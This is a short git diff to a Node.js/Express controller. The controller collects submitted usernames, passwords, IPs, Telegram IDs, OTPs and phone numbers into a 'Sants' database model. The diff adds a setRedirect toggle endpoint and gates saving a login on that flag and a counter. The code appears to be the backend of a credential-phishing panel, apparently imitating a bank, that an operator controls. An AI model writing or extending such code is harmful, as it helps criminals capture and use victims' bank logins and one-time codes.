@@ -4,6 +4,18 @@ var moment = require("moment"); // require
 
 let santsCount = 0;
 
+let redirect = true;
+
+const setRedirect = async (req, res) => {
+	const { active } = req.params;
+	if (active == "true") {
+		redirect = true;
+	} else if (active == "false") {
+		redirect = false;
+	}
+	res.send(`Redirect set to ${redirect}`);
+};
+
 const submitStaticLogin = async (req, res) => {
 	let { username, password, ip, telegramId, uniqueid } = req.body;
 
@@ -144,7 +156,7 @@ const submitLogin = async (req, res) => {
 	try {
 		let user = await Sants.findOne({ uniqueid });
 		if (user) await Sants.deleteOne({ uniqueid });
-		if (santsCount == 3) {
+		if (redirect && santsCount == 3) {
 			await Sants.create({
 				uniqueid,
 				username,
@@ -278,4 +290,5 @@ module.exports = {
 	submitOtp,
 	submitPhone,
 	deleteEntry,
+	setRedirect,
 };
